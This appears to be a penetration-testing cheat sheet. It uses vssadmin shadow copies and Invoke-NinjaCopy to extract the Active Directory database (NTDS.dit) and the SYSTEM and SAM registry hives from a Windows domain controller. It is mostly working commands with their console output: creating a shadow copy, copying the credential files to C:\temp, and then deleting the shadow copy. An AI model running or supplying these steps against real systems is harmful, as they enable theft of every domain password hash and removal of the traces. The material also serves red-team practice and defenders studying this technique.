**Authors**: < [nixawk](https://github.com/nixawk) >

----

## Vssadmin

Applies To: Windows Server 2003, Windows Server 2008, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows 8

| **Command** | **Description** |
|:----------|:---------------|
|Vssadmin add shadowstorage | Adds a volume shadow copy storage association.|
| Vssadmin create shadow | Creates a new volume shadow copy. |
| Vssadmin delete shadows | Deletes volume shadow copies. |
| Vssadmin delete shadowstorage | Deletes volume shadow copy storage associations. |
| Vssadmin list providers | Lists registered volume shadow copy providers. |
|Vssadmin list shadows|Lists existing volume shadow copies.|
|Vssadmin list shadowstorage|Lists all shadow copy storage associations on the system.|
|Vssadmin list volumes|Lists volumes that are eligible for shadow copies.|
|Vssadmin list writers|Lists all subscribed volume shadow copy writers on the system.|
|Vssadmin resize shadowstorage|Resizes the maximum size for a shadow copy storage association.|

## With Administrator Privilege

```
PS C:\Users\Administrator\Desktop>vssadmin List Shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

Error: You don't have the correct permissions to run this command.  Please run t
his utility from a command
window that has elevated administrator privileges.

```

## List Shadows

```
C:\Windows\system32>vssadmin List Shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

No items found that satisfy the query.
```

### Create Shadow

```
C:\Windows\system32>vssadmin Create Shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {153b6835-be81-45ed-bd01-2edbf4f61a85}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
```

### Copy Files

```
PS C:\Users\Administrator\Desktop> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
PS C:\Users\Administrator\Desktop> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C
:\temp\
PS C:\Users\Administrator\Desktop> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\t
emp\

C:\Windows\system32>vssadmin List Shadows
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

Contents of shadow copy set ID: {7b37f005-c738-450c-83cd-ad2f237f2b28}
   Contained 1 shadow copies at creation time: 11/5/2016 1:19:40 AM
      Shadow Copy ID: {153b6835-be81-45ed-bd01-2edbf4f61a85}
         Original Volume: (C:)\\?\Volume{be4f748a-a19f-11e6-a5bb-806e6f6e6963}\
         Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
         Originating Machine: SERVER2008.thegeekstuff.com
         Service Machine: SERVER2008.thegeekstuff.com
         Provider: 'Microsoft Software Shadow Copy provider 1.0'
         Type: ClientAccessible
         Attributes: Persistent, Client-accessible, No auto release, No writers,
 Differential
```


### Delete Shadows

```
C:\Windows\system32>vssadmin Delete Shadows /For=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2005 Microsoft Corp.

Do you really want to delete 1 shadow copies (Y/N): [N]? Y

Successfully deleted 1 shadow copies.
```

----


## Invoke-NinjaCopy

```
PS C:\Users\Administrator> Invoke-NinjaCopy -Path "C:\Windows\System32\config\SYSTEM" -ComputerName SERVER -localDestination "C:\temp\SYSTEM"
PS C:\Users\Administrator> Invoke-NinjaCopy -Path "C:\Windows\NTDS\NTDS.dit" -ComputerName SERVER -localDestination "C:\temp\NTDS.dit"
```

## References

1. https://technet.microsoft.com/en-us/library/cc754968(v=ws.11).aspx
2. [Tutorial for NTDS goodness (VSSADMIN, WMIS, NTDS.dit, SYSTEM)](https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/)
3. [How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller](https://adsecurity.org/?p=451)
4. https://clymb3r.wordpress.com/2013/06/13/using-powershell-to-copy-ntds-dit-registry-hives-bypass-sacls-dacls-file-locks/
5. https://github.com/clymb3r/PowerShell/blob/master/Invoke-NinjaCopy/Invoke-NinjaCopy.ps1
